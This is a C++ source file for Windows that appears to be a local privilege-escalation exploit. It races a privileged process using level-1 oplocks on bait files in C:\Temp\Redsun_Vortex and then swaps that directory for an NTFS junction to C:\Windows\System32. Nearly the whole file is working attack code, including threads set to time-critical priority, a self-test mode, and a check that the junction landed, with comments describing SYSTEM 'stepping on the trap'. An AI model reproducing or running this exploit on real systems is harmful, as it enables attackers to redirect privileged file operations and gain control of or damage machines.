#include <Windows.h>
#include <winioctl.h>
#include <vector>
#include <thread>
#include <atomic>
#include <iostream>
#include <string>

// Standard Reparse Buffer Header
#define REPARSE_MOUNTPOINT_HEADER_SIZE 8

typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    struct {
        USHORT SubstituteNameOffset;
        USHORT SubstituteNameLength;
        USHORT PrintNameOffset;
        USHORT PrintNameLength;
        WCHAR PathBuffer[1];
    } MountPointReparseBuffer;
} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;

// Verify the junction landed and print its destination
void VerifyJunction(const std::wstring& dir) {
    BYTE buf[MAXIMUM_REPARSE_DATA_BUFFER_SIZE] = { 0 };
    HANDLE h = CreateFileW(dir.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);

    if (h == INVALID_HANDLE_VALUE) {
        std::wcout << L"[verify] Could not open dir for reparse query. GLE=" << GetLastError() << std::endl;
        return;
    }

    DWORD bytesReturned = 0;
    if (DeviceIoControl(h, FSCTL_GET_REPARSE_POINT, NULL, 0, buf, sizeof(buf), &bytesReturned, NULL)) {
        PREPARSE_DATA_BUFFER rdb = reinterpret_cast<PREPARSE_DATA_BUFFER>(buf);
        if (rdb->ReparseTag == IO_REPARSE_TAG_MOUNT_POINT) {
            std::wstring dest(rdb->MountPointReparseBuffer.PathBuffer,
                rdb->MountPointReparseBuffer.SubstituteNameLength / sizeof(WCHAR));
            std::wcout << L"[verify] Junction confirmed -> " << dest << std::endl;
        } else {
            std::wcout << L"[verify] Unexpected reparse tag: 0x" << std::hex << rdb->ReparseTag << std::endl;
        }
    } else {
        std::wcout << L"[verify] FSCTL_GET_REPARSE_POINT failed. GLE=" << GetLastError() << std::endl;
    }
    CloseHandle(h);
}

// The "Pivot" - Replacing the floor beneath the Giant
bool ForceJunction(const std::wstring& dir, const std::wstring& target) {
    HANDLE hDir = CreateFileW(dir.c_str(), GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);

    if (hDir == INVALID_HANDLE_VALUE) return false;

    std::wstring ntTarget = L"\\??\\" + target;
    DWORD targetByteLen = (DWORD)(ntTarget.length() * sizeof(wchar_t));
    DWORD bufSize = FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer) + targetByteLen + 4;

    std::vector<BYTE> buffer(bufSize, 0);
    PREPARSE_DATA_BUFFER rdb = reinterpret_cast<PREPARSE_DATA_BUFFER>(buffer.data());

    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = (USHORT)(
        FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer)
        - REPARSE_MOUNTPOINT_HEADER_SIZE
        + targetByteLen + sizeof(WCHAR));
    rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetByteLen;
    rdb->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetByteLen + 2);

    memcpy(rdb->MountPointReparseBuffer.PathBuffer, ntTarget.c_str(), targetByteLen);

    DWORD bytesReturned;
    BOOL success = DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, rdb, bufSize, NULL, 0, &bytesReturned, NULL);

    CloseHandle(hDir);
    return success;
}

// The Trap - Arming the Oplock on a High-Priority Thread
void ArmRace(int id, std::wstring workDir, std::wstring targetPath,
             std::atomic<bool>& succeeded, std::atomic<int>& armed) {
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    std::wstring bait = workDir + L"\\target_" + std::to_wstring(id) + L".tmp";
    HANDLE hBait = CreateFileW(bait.c_str(), GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);

    if (hBait == INVALID_HANDLE_VALUE) {
        std::wcout << L"[-] Thread " << id << L": failed to create bait file. GLE=" << GetLastError() << std::endl;
        return;
    }
    std::wcout << L"[+] Thread " << id << L": bait file created." << std::endl;

    OVERLAPPED ov = { 0 };
    ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!ov.hEvent) {
        CloseHandle(hBait);
        return;
    }

    // Request Level 1 Oplock (The exclusive lock that causes the "Hang")
    DeviceIoControl(hBait, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, NULL, &ov);
    std::wcout << L"[+] Thread " << id << L": oplock armed, waiting..." << std::endl;
    armed.fetch_add(1);

    // Wait for the Giant to step on the trap
    if (WaitForSingleObject(ov.hEvent, INFINITE) == WAIT_OBJECT_0) {
        // SYSTEM has touched the file. The kernel has paused the Giant.
        // We have MICROSECONDS to act.
        CloseHandle(hBait);
        CloseHandle(ov.hEvent);
        DeleteFileW(bait.c_str());

        if (!succeeded.load() && ForceJunction(workDir, targetPath)) {
            succeeded.store(true);
            std::wcout << L"[!] VORTEX THREAD " << id << L": PIVOT SUCCESSFUL." << std::endl;
        }
    } else {
        CloseHandle(hBait);
        CloseHandle(ov.hEvent);
    }
}

// Self-test: open a bait file to manually fire the oplock break
void SelfTest(const std::wstring& workDir, const std::atomic<int>& armed) {
    // Wait until all traps are armed before triggering
    while (armed.load() < 15) Sleep(10);

    std::wcout << L"\n[test] All traps armed. Firing oplock break on target_0.tmp..." << std::endl;
    std::wstring bait = workDir + L"\\target_0.tmp";

    HANDLE h = CreateFileW(bait.c_str(), GENERIC_READ, FILE_SHARE_NONE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
}

int main(int argc, char* argv[]) {
    bool selfTest = (argc > 1 && std::string(argv[1]) == "--test");

    std::wstring workDir = L"C:\\Temp\\Redsun_Vortex";
    std::wstring target = L"C:\\Windows\\System32";

    // Create parent C:\Temp if it doesn't exist, then the work directory
    CreateDirectoryW(L"C:\\Temp", NULL);
    if (!CreateDirectoryW(workDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        std::wcout << L"[-] Failed to create work directory. GLE=" << GetLastError() << std::endl;
        return 1;
    }
    std::wcout << L"[*] Work directory ready: " << workDir << std::endl;
    if (selfTest) std::wcout << L"[*] Self-test mode enabled." << std::endl;

    std::atomic<bool> succeeded{false};
    std::atomic<int>  armed{0};
    std::vector<std::thread> swarm;

    for (int i = 0; i < 15; i++)
        swarm.emplace_back(ArmRace, i, workDir, target, std::ref(succeeded), std::ref(armed));

    if (selfTest)
        swarm.emplace_back(SelfTest, workDir, std::ref(armed));

    for (auto& t : swarm) t.join();

    if (succeeded.load())
        VerifyJunction(workDir);
    else
        std::wcout << L"[-] No pivot occurred." << std::endl;

    return succeeded.load() ? 0 : 1;
}
